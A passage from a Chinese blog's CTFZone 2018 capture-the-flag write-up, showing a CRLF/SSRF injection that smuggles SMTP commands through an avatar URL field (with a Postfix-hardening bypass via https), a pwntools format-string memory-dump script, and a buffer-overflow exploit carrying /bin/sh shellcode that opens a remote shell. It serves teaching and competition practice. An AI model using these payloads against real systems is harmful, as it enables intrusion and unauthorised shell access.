<p>参考网址：<a href="https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals/web_mmorpg" rel="external nofollow" target="_blank">https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals/web_mmorpg</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HELO 127.0.0.1</span><br><span class="line">MAIL FROM:&lt;A@B.c&gt;</span><br><span class="line">RCPT TO:&lt;1096026150@qq.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: AAA@B.C</span><br><span class="line">To: 1096026150@qq.com</span><br><span class="line">Subject: give me flag</span><br><span class="line">.</span><br><span class="line">QUIT</span><br></pre></td></tr></table></figure>
<p>payload1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &apos;web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar&apos; -H &apos;Cookie: session=eyJ1aWQiOjg2NX0.Dkan9A.U5_9q25Izo0Y4yJq__o2oAdRAc0&apos; --data &apos;url=https://127.0.0.2%0d%0aHELO 127.0.0.2%0aMAIL FROM: &lt;A@B.C&gt;%0aRCPT TO: &lt;1096026150@qq.com&gt;%0aDATA%0aFROM: AAA@B.C%0aTO: 1096026150@qq.com%0aSUBJECT: GIB%0d%0a.%0d%0a%0aQUIT%0a:25&amp;action=save&apos;</span><br></pre></td></tr></table></figure>
<p>注意，<code>url</code>需要使用<code>https</code>,ip地址除了<code>127.0.0.2</code>,也可以使用<code>0.0.0.0</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#define DEF_SMTPD_FORBID_CMDS    &quot;CONNECT GET POST&quot;</span><br><span class="line"></span><br><span class="line">        /* Ignore smtpd_forbid_cmds lookup errors. Non-critical feature. */</span><br><span class="line">        if (cmdp-&gt;name == 0) &#123;</span><br><span class="line">        state-&gt;where = SMTPD_CMD_UNKNOWN;</span><br><span class="line">        if (is_header(argv[0].strval)</span><br><span class="line">            || (*var_smtpd_forbid_cmds</span><br><span class="line">         &amp;&amp; string_list_match(smtpd_forbid_cmds, argv[0].strval))) &#123;</span><br><span class="line">                msg_warn(&quot;non-SMTP command from %s: %.100s&quot;,</span><br><span class="line">                     state-&gt;namaddr, vstring_str(state-&gt;buffer));</span><br><span class="line">                smtpd_chat_reply(state, &quot;221 2.7.0 Error: I can break rules, too. Goodbye.&quot;);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>原因:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Our mistake was missing the special case implemented in postfix:</span><br><span class="line">There is a hardening which targets exactly what we wanted to do - using HTTP request with injected headers to smuggle SMTP commands. The way to bypass this was to use https instead of http, because in such case the initial part of the request will actually be encrypted, and SMTP will ignore it, and the Host will be in plaintext so the server will receive nice set of SMTP commands. </span><br><span class="line">简单来说，就是当我们使用http请求，并使用 http header注入 来注入SMTP命令的时候，会被拦截。可以使用 https， 因为 https 流量是加密过的，这样，SMTP会忽略该流量，当流量到达主机，会被解密，这时候SMTP就会收到一组漂亮的 SMTP 命令。</span><br></pre></td></tr></table></figure>
<p>结果:</p>
<p><img src="/assets/ctfzone/TIM截图20180803235132.png" alt=""></p>
</li>
</ol>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="easypwn-strings"><a href="#easypwn-strings" class="headerlink" title="easypwn_strings"></a>easypwn_strings</h2><p>dump.py:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def conn():</span><br><span class="line">    return remote(&apos;pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one&apos;, 1234)</span><br><span class="line"></span><br><span class="line">def dump(adr,frmt=&apos;p&apos;):</span><br><span class="line">    r.recvuntil(&apos;StrRemoveLastSymbols&apos;)</span><br><span class="line">    r.recvuntil(&apos;\n&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;:&apos;)</span><br><span class="line">    r.recvuntil(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">    leak_part = &quot;|%19$&#123;&#125;|&quot;.format(frmt)</span><br><span class="line">    out = leak_part.ljust(4*10,&quot;A&quot;)+&quot;EOF_&quot;+p32(adr)</span><br><span class="line">    r.sendline(out)</span><br><span class="line">    r.sendline(&apos;0&apos;)</span><br><span class="line">    r.recvuntil(&apos;Result:&apos;)</span><br><span class="line">    return r.recvuntil(&quot;|A&quot;)[:-2].split(&quot;|&quot;)[1]</span><br><span class="line"></span><br><span class="line">start_addr = 0x8048750</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        fd = open(&quot;dumped_file&quot;,&quot;a&quot;)</span><br><span class="line">        r = conn()</span><br><span class="line">        data = dump(start_addr,&apos;s&apos;)</span><br><span class="line">        print &quot;|0x%08x|%s|&quot; % (start_addr,data)</span><br><span class="line">        if data == &quot;(null)&quot; or data == &quot;&quot;:</span><br><span class="line">            fd.write(&quot;\x00&quot;)</span><br><span class="line">            start_addr += 1</span><br><span class="line">        else:</span><br><span class="line">            fd.write(data+&quot;\x00&quot;)</span><br><span class="line">            start_addr += len(data)+1</span><br><span class="line">        fd.close()</span><br><span class="line">        r.close()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print e</span><br><span class="line">        print &quot;[!] execption&quot;</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
<p>payload.py:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line">from pwn import *</span><br><span class="line">def recvlines(lnum):</span><br><span class="line">    global p</span><br><span class="line">    res=&quot;&quot;</span><br><span class="line">    for x in range(lnum):</span><br><span class="line">        res+=p.recvline()</span><br><span class="line">    return res</span><br><span class="line"> </span><br><span class="line">host=&quot;pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one&quot;</span><br><span class="line">port=1234</span><br><span class="line"> </span><br><span class="line">base_buf=0x80492e0</span><br><span class="line">shellcode=&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">payload=(&quot;y&quot;+shellcode).ljust(256,&quot;\x90&quot;)+p32(base_buf+1)</span><br><span class="line">p=remote(host,port)</span><br><span class="line">#p=process(&quot;./babypwn&quot;)</span><br><span class="line">print recvlines(4)</span><br><span class="line">p.sendline(&quot;X&quot;)</span><br><span class="line">print recvlines(3)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/39475/">https://www.tiandiwuji.top/posts/39475/</a>
            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/39475/">August 3rd 2018, 10:11:42 am</a>
            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/posts/27029/" title="0ctf2018-babyheap">
                    <div class="nextTitle">0ctf2018-babyheap</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/posts/13474/" title="real-world-ctf">
                    <div class="prevTitle">real-world-ctf</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
        <script type="text/javascript">
            (function (d, s) {
                var j, e = d.getElementsByTagName(s)[0];
                if (typeof LivereTower === 'function') { return; }
                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
    </div>

<!-- City版安装代码已完成 -->
    
    
    <!--PC和WAP自适应版-->

    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
            
        
    
        
            
                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
    
     
    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style="top:50vh;">
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Piggy-Bank"><span class="toc-number">1.1.</span> <span class="toc-text">Piggy Bank</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Magician"><span class="toc-number">1.2.</span> <span class="toc-text">Magician</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MMORPG-3000"><span class="toc-number">1.3.</span> <span class="toc-text">MMORPG 3000</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easypwn-strings"><span class="toc-number">2.1.</span> <span class="toc-text">easypwn_strings</span></a></li></ol></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 54
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/11284/">jvm-java虚拟机如何运行java字节码</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/37116/">汇编指令大全</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/1345/">pwnable.kr_刷刷刷</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/62824/">dubbo项目结构</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/28842/">zookeeper安装-启动</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/11234/">dubbo-启动</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/posts/32469/">noxctf-writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">websec.fr-writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/03</span><a class="archive-post-title" href="/posts/39475/">ctfzone-ctf</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/13474/">real-world-ctf</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/6549/">ISITDTU-CTF</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/23</span><a class="archive-post-title" href="/posts/46785/">巅峰极客ctf</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/posts/5109/">php-命令执行</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/62555/">RSA学习</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/28940/">ssti</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/15</span><a class="archive-post-title" href="/posts/45992/">php命令执行函数</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/09</span><a class="archive-post-title" href="/posts/63527/">ollyice</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/16486/">web安全备忘录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/21</span><a class="archive-post-title" href="/posts/32268/">sctf2018</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/14</span><a class="archive-post-title" href="/posts/54865/">python多线程和lock和Rlock</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/54897/">linux格式化字符串漏洞</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/50844/">linux命令执行</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/51203/">LRE_PAYLOAD绕过open_basedir</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/17498/">mysql忘记密码/修改密码</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/28</span><a class="archive-post-title" href="/posts/26365/">suctf2018</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/09</span><a class="archive-post-title" href="/posts/53269/">pwn备忘录</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/08</span><a class="archive-post-title" href="/posts/62655/">cbc翻转</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/07</span><a class="archive-post-title" href="/posts/60875/">misc思路</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/33488/">简单的命令（shell+python）</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/15636/">parse_url + curl</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/posts/22230/">ddctf2018</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/posts/65402/">PHP代码审计归纳</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/52452/">xss</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/24854/">url相对路径和绝对路径</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/26</span><a class="archive-post-title" href="/posts/40688/">python3和python2 base64的问题</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/posts/41083/">sql注入大全</a>
        </li>
    
    </ul></div>
  </div>
        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
    
        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
    
        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
    
        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
    
        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
    
        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
    
        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
    
        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
    
        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
    
        <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
    
        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
    
        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
    
        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
    
        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
    
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
    缺失模块。<br>
    1、请确保node版本大于6.2<br>
    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
    3、在根目录_config.yml里添加配置：
    <pre style="color: #787878; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: true
    tags: true</pre>
    </div> 
    <div class="sidebar-tags-list"></div>
</div>
        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
        <span class="sidebar-category-name" data-categories="安全"><span class="iconfont-archer">&#xe60a;</span>安全</span>
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>
    </div>
</div> 
    <script>
    var siteMeta = {
        root: "/",
        author: "Tianji"
    }
</script>
    <!-- CDN failover -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ === 'undefined')
        {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
        }
    </script>
    <script src="/scripts/main.js"></script>
    <!-- algolia -->
    
    <!-- busuanzi  -->
    
    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ  -->
    
    
    <!-- async load share.js -->
    
        <script src="/scripts/share.js" async></script>    
     
    </body>
</html>


